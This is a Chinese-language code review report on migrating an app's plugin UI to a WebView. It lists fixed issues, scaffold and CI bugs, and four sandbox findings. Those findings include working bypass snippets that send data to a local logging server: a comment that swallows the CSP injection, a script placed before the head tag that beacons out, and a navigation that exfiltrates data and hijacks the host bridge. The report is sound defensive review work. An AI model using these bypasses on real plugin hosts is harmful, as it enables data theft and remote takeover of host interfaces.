# Phase 4D 第三轮复审（a0aab15f：插件 UI 迁移到 WebView）

> 审查对象：主仓库 `a0aab15f`（已推送到 `main`），以及 xcpc-plugins 仓库的 `cfaea6e`（已推送，CI 已通过）。
>
> 环境：与前两轮相同。
> - 全新的 `<dataDir>`（`XCPC_DATA_DIR` 和 `XDG_*` 都指向临时目录）。
> - 插件仓库用线上官方仓库。
> - 桌面端用 `nsh dev`，窗口 960×980，在 niri 下用 linux-cua 操作。
> - 另起一个本地 HTTP 服务（127.0.0.1:8765），记录插件页面发出的所有请求。
>
> 前两轮报告：[review-phase4d.md](./review-phase4d.md)、[review-phase4d-r2.md](./review-phase4d-r2.md)。

## 总评

这一轮把插件 UI 从「Core QuickJS + 声明式 VNode」换成了「原生 WebView 加载 `ui.html`」。

**可用性大幅改善。** 前两轮遗留的 4 个阻断问题都已解决：
- 位运算工作台点一下立刻响应；
- 图论画板的输入、拖拽都正常；
- 官方仓库的 CI 首次跑通，SDK 包也能下载了。

**但沙箱有实打实的漏洞。** 宿主只靠往 HTML 里注入一个 `<meta>` CSP 来限制联网，有三种方法能绕过，全部实测成功：

- 不声明任何权限、因此不会弹信任确认的插件，可以把数据发到任意服务器；
- 插件页面可以跳转到外部网页，跳过去之后这个网页仍能以插件身份调用宿主接口。

此外，`xcpc plugin init --vite` 生成的项目构建、link 之后是**空白页**。新插件作者第一步就会卡住。

| 项 | 状态 |
| --- | --- |
| 阻断 1 输入/点击失效 | ✅ 已修复（上轮已确认） |
| 阻断 2 位运算工作台慢 | ✅ 已修复：点击即时响应，应用进程累计 CPU 约 4 秒 |
| 阻断 3 `init --vite` 装不上依赖 | ✅ 依赖能装上、能构建；但产物是空白页，见新问题 2 |
| 阻断 4 官方仓库 CI | ✅ `cfaea6e` 的 CI 成功，release 里 4 个插件、`index.json`、SDK 包都在 |
| 安全 B 跨仓库更新继承信任 | ✅ 已修复：来源仓库变化时清空信任记录（`manager.rs:448`） |
| 上轮 A Windows 热重载 | ✅ 事件过滤已包含 `Modify(Any)` |
| 上轮 C 装插件导致当前插件重建 | ✅ 已修复：改为按插件计数；装无关插件时当前页面不重载 |
| 上轮 D 仓库错误重复、原始错误串 | ⚠️ 不再重复，但仍是原始错误串；仓库源面板里对应那一行也不显示错误 |
| 上轮 E `nsh test` 失败 | ✅ 本地 205/205 通过；CI 上 2 个失败，见新问题 5 |
| 上轮 F 手动记一题弹窗跳动 | ✅ 弹窗恢复居中，候选列表改为浮层，不再撑高弹窗 |
| 下载重定向校验 | ✅ `get_bytes` 改为手动跟随重定向，每一跳都检查 https |

## 安全（WebView 沙箱）

宿主的隔离办法是在 `PluginWebView.tsx:injectPluginHtml` 里，用正则找到插件 HTML 中第一个 `<head>`，在它后面插入三样东西：
- CSP `<meta>`（`connect-src 'none'`、`img-src data: blob:`）；
- 主题变量；
- `window.xcpc` 桥接脚本。

`nsh.json` 没有声明 `webview` 能力，NSH 在这种情况下对导航**一律放行**（`nsh-platform-linux/src/native/web.rs:643`：`let Some(access) = access else { return true }`）。

测试插件都不声明任何权限（`domains = []`、`workspace_read = false`），所以 `xcpc plugin install` 后直接可用，不会弹信任确认。

### S1（高）用注释吞掉注入，CSP 和桥接都失效，可任意联网

`ui.html` 的第一行写 `<!--<head>-->`。正则命中的是注释里的 `<head>`，于是 CSP 和桥接脚本都被插进了注释里，不会生效。

- **实测**：`fetch("http://127.0.0.1:8765/...")` 返回 200，本地服务收到了请求。
- **更严重的是**，页面不需要 `window.xcpc`，自己调用 `window.nsh.postMessage({__xcpc:"rpc",...})`，宿主照样执行。`handleMessage` 不校验消息来源，插件身份取的是宿主侧的 `props.pluginId`。

截图：[01-csp-bypass-comment.png](./review-phase4d-r3/01-csp-bypass-comment.png)（`xcpc=undefined`，`fetch OK 200`，原始 RPC 返回 `ok=true`）。

### S2（高）`<head>` 之前的脚本不受 CSP 限制

```html
<!doctype html><html><script>new Image().src="http://127.0.0.1:8765/..."</script><head>…
```

CSP 只对它出现之后的内容生效，而这段脚本在 `<head>` 之前，执行时 CSP 还不存在。实测服务端收到了 `/prehead-b.png`。

截图：[02-csp-bypass-prehead.png](./review-phase4d-r3/02-csp-bypass-prehead.png)（之后的 fetch 被拦了，但前面那条请求已经发出去）。

### S3（高）页面可以跳转到外部网页，外部网页继承插件的全部宿主接口

页面格式完全规范、CSP 也生效，只执行一句 `location.href = "http://127.0.0.1:8765/nav-c?leak=1"`：

1. **数据外传**：跳转本身就把查询参数带了出去，CSP 拦不住顶层跳转。
2. **远程网页接管插件**：外部网页加载进同一个 WebView 后，`window.nsh.postMessage` 仍然可用。实测远程网页调用 `runTool` 和 `storage.set` 都返回 `ok:true`，结果又被它回传给服务器。

截图：[03-remote-page-bridge.png](./review-phase4d-r3/03-remote-page-bridge.png)。

后果：
- 如果插件有 `workspace_read`，用户信任它时以为它「只读本地、不联网」（manifest 里 `domains = []`），实际上任意远程网页都能拿到题库数据。
- 外部网页嵌在工具面板里，外观和应用内的页面一样，还可以用来钓鱼。

### S4（中）剪贴板读取和打开外链不受任何权限约束

- `clipboard.readText`：没有声明任何权限的插件也能静默读取系统剪贴板，剪贴板里常有 token 或密码。
  - 实测调用成功，返回 0 字符。窗口在后台时 Wayland 可能拿不到剪贴板内容，所以没有验证能否读到实际内容；但代码层面没有任何限制。
- `openExternal`：可以用系统浏览器打开任意 http(s) 地址并附带参数，也是一条外传通道，不过用户看得见。

### 修复方向（供参考，未修改代码）

- **CSP 不依赖插件 HTML 的结构。** 改为：
  - 由宿主生成外层文档，插件内容放进 `srcdoc` / `sandbox` iframe；
  - 或者把 CSP 作为响应头下发（例如用自定义 scheme 提供插件页面）。
- **导航默认禁止。** 在 `nsh.json` 声明 `webview` 能力，或者让 WebView 拒绝一切顶层导航。
- **`handleMessage` 校验消息来源**（当前文档 URL 必须是插件自己的页面），否则拒绝 RPC。
- **剪贴板读取纳入权限声明**，或者每次读取都需要用户手势或确认。
- **文案**：获取工具弹窗写着「插件在独立沙箱中运行」，在修复之前这句话不成立。

## 新问题

### 1. 规格没有同步（需要你确认）

这次改了核心设计：插件 UI 从 `ui.js` 在 NSH 渲染层运行（4C 时还是信任模型），换成了 WebView 加载 `ui.html`。但以下文档仍是旧描述：

- `docs/product.md:157,175`：「QuickJS 沙箱 + 声明式 UI Schema」「桌面 `ui.js` 插件」；
- `docs/roadmap.md`：Phase 4C 第 1 条、Phase 4D 第 1、2 条（`pluginSdk.tsx`、`ui.{Each,Row,…}`、`sdk.useTool`、`/ui` 入口是「NSH UI 类型与虚拟模块」）；
- `docs/specs/phase-4d-plugin-sdk-and-ecosystem.md`。

AGENTS.md 要求实现与规格冲突时先问用户，设计变化后同步 `docs/`。

### 2. `xcpc plugin init --vite` 生成的插件是空白页（阻断，开发者路径）

复现：
1. `init --vite`
2. `npm install`
3. `npm run build`
4. `xcpc plugin link dist`
5. 在「工具」里打开这个插件，看到一片空白。

截图：[04-vite-scaffold-blank.png](./review-phase4d-r3/04-vite-scaffold-blank.png)。

原因：
- Vite 产出的 `<script type="module">` 放在 `<head>` 里，模块脚本本来会延迟执行。
- `packages/plugin-sdk/vite.mjs:168-183` 把它原地换成了普通内联 `<script>`，于是脚本在 body 解析前就执行了。
- 这时 `document.getElementById("app")` 是 `null`，`innerHTML` 赋值报错，页面空白。

官方插件之所以正常，是因为 `main.ts` 自己等待了 `DOMContentLoaded`；脚手架生成的模板没有等。我手动把脚本挪到 `</body>` 前，热重载后页面立即正常显示。

另外，插件页面的 JS 报错**完全不会显示**：没有错误视图，也没有提示，开发者只能看到空白。

### 3. 仓库拉取失败时提示仍是原始错误（别扭，上轮 D 部分修复）

- 列表上方的横幅现在只出现一次，但内容是 `http://127.0.0.1:8765/index.json：JSON_ERROR: expected value at line 1 column 1`，见 [05-repo-error-raw.png](./review-phase4d-r3/05-repo-error-raw.png)。
- 打开「仓库源」面板后，坏仓库那一行没有显示任何错误（代码本应在这一行下方显示红字，`PluginRepoBrowserModal.tsx:443`），横幅又被隐藏了。结果在面板里看不出哪个仓库坏了，见 [06-repo-row-no-error.png](./review-phase4d-r3/06-repo-row-no-error.png)。

### 4. 获取工具弹窗打开时，背后的页面会跟着跳（打磨）

在弹窗里连续安装两个插件，背后的工具页面先跳到第一个，再跳到第二个。弹窗还没关，背后的内容就换了两次，有点突兀。可以只在关闭弹窗时切到最后装的那个，或者干脆不切。

另外，这个弹窗用了 `topOffset={72}` 顶部对齐，和「对话框居中」的偏好不一致。好在它是可滚动列表，高度变化不大，影响很小。

### 5. CI 的桌面测试失败（2 个），本地全部通过

`a0aab15f` 的 CI 中「Desktop (nsh check & test)」失败，205 个测试里 203 个通过：

- `tools.test.tsx › Awkward 7, 10 & New Issue D`：断言中文文案「校验失败」，CI 在英文 locale 下拿到的是英文，**测试依赖系统 locale**，不是隔离的。
- `tools.test.tsx › A3: HeadlessToolRunner boolean switch toggles repeatedly`：`expected false to be true`，本地能过，像是时序相关的偶发失败。

本地默认环境下 `nsh test` 205/205 通过。

### 6. 打磨

- `init --vite` 跑完只列出文件，没有告诉用户下一步要做什么（`npm install`、`npm run build`、`xcpc plugin link dist`）。
- 在项目根目录运行 `xcpc plugin check .` 报两条 `failed to read entry 'index.js'`，没有提示应该检查 `dist/`。
- 纯 JS 模板（`init` 不带 `--vite`）用的是 `--xcpc-surface`，宿主并没有注入这个变量（宿主有的是 `--xcpc-card` 和 `--xcpc-muted`）。
- 脚手架插件的显示名直接由 id 首字母大写得到（`vp` 显示为「Vp」），描述是英文的「Custom offline tool plugin.」，放在中文界面里显得突兀。

## 校验

- `nsh test`（本地默认环境）：205/205 通过。
- `xcpc plugin init --vite`：`npm install` 和 `npm run build` 都成功，`check dist`、`link dist`、`pack dist` 都通过。
- 线上：xcpc-plugins 的 CI run 45606074006 成功。`official-latest` 的资产都在：4 个插件 zip、`index.json`、`xcpc-plugin-sdk.tgz`。
- 测试只用了临时 `<dataDir>`、临时工作区和本机 127.0.0.1 服务，没有碰你的真实配置。测试插件和测试进程都已停掉。
